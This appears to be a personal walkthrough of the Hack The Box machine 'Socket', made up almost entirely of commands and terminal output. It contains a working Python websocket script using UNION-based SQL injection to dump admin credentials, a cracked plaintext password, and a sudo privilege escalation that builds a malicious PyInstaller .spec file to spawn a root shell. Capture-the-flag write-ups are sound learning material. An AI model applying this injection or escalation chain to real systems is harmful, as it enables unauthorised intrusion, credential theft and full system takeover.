─$ nmap 10.10.11.206
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-11 23:42 EDT
Nmap scan report for 10.10.11.206
Host is up (0.53s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 56.56 seconds
                                                        
it says that it is made with flask

use stews 

python3 STEWS-vuln-detect.py http://10.10.11.206

![](20230712075738.png)

so  5789 oirt us also open

 10.10.11.206 

 nmap showed 22 80 and there is one more higher port

 python3 vuln_detect.py -1 -n -u 10.10.11.206:5789


 python3 vuln_detect.py -1 -n -u 10.10.11.206:5789
   Testing ws://10.10.11.206:5789
>>>Note: ws://10.10.11.206:5789 allowed http or https for origin
>>>Note: ws://10.10.11.206:5789 allowed null origin
>>>Note: ws://10.10.11.206:5789 allowed unusual char (possible parse error)
>>>VANILLA CSWSH DETECTED: ws://10.10.11.206:5789 likely vulnerable to vanilla CSWSH (any origin)
====Full list of vulnerable URLs===
['ws://10.10.11.206:5789']
['>>>VANILLA CSWSH DETECTED: ws://10.10.11.206:5789 likely vulnerable to vanilla CSWSH (any origin)']

```

[+] Processing qreader
[+] Pyinstaller version: 2.1+
[+] Python version: 3.10
[+] Length of package: 108535118 bytes
[+] Found 305 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_subprocess.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: pyi_rth_multiprocessing.pyc
[+] Possible entry point: pyi_rth_pyqt5.pyc
[+] Possible entry point: pyi_rth_setuptools.pyc
[+] Possible entry point: pyi_rth_pkgres.pyc
[+] Possible entry point: qreader.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
[!] Please run this script in Python 3.10 to prevent extraction errors during unmarshalling
[!] Skipping pyz extraction
[+] Successfully extracted pyinstaller archive: qreader

You can now use a python decompiler on the pyc files within the extracted directory

```
after looking into the source code we can find the exploit

```
from websocket import create_connection
import json
ws_host = 'ws://qreader.htb:5789'
VERSION = '0.0.3" UNION SELECT username,password,"3","4" from users;-- -'
ws = create_connection(ws_host + '/version')
ws.send(json.dumps({'version': VERSION}))
result = ws.recv()
print(result)
ws.close()
```

python3 exploit_socket.py
{"message": {"id": "admin", "version": "0c090c365fa0559b151a43e0fea39710", "released_date": "3", "downloads": "4"}}

cracking it in crackstation
	denjanjade122566
                     
the admin is somehow tkeller


tkeller@socket:~$ sudo -l
Matching Defaults entries for tkeller on socket:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User tkeller may run the following commands on socket:
    (ALL : ALL) NOPASSWD: /usr/local/sbin/build-installer.sh


running linpeas.sh

Proc 1305 with ppid 1263 is run by user svc but the ppid user is root
Proc 1306 with ppid 1263 is run by user svc but the ppid user is root
Proc 1959 with ppid 1 is run by user tkeller but the ppid user is root
Proc 2066 with ppid 1956 is run by user tkeller but the ppid user is root

tkeller@socket:~$ ps -aux | grep 1305
svc         1305  0.0  1.7 385300 70292 ?        Ssl  05:42   0:02 python3 /var/www/main/main.py
tkeller    22305  0.0  0.0   6476  2436 pts/0    S+   07:31   0:00 grep --color=auto 1305
tkeller@socket:~$ ps -aux | grep 1306
_laurel      776  0.0  0.2  13064  8948 ?        S<   05:42   0:04 /usr/local/sbin/laurel --config /etc/laurel/config.toml
svc         1306  0.0  0.5  32540 23348 ?        Ss   05:42   0:00 python3 /var/www/ws_server/server.py
tkeller    22307  0.0  0.0   6608  2476 pts/0    S+   07:31   0:00 grep --color=auto 1306

```
tkeller@socket:~$ echo 'import os;os.system("/bin/bash")' > root.spec
tkeller@socket:~$ ls
linpeas.sh  root.spec  snap  user.txt
tkeller@socket:~$ sudo /usr/local/sbin/build-installer.sh build root.spec
123 INFO: PyInstaller: 5.6.2
123 INFO: Python: 3.10.6
126 INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35
129 INFO: UPX is not available.
root@socket:/home/tkeller# cat /root/root.tx
cat: /root/root.tx: No such file or directory
root@socket:/home/tkeller# cat /root/root.txt
7173a098ec93374dce2059554c8cd749
```

https://www.hackthebox.com/achievement/machine/256742/535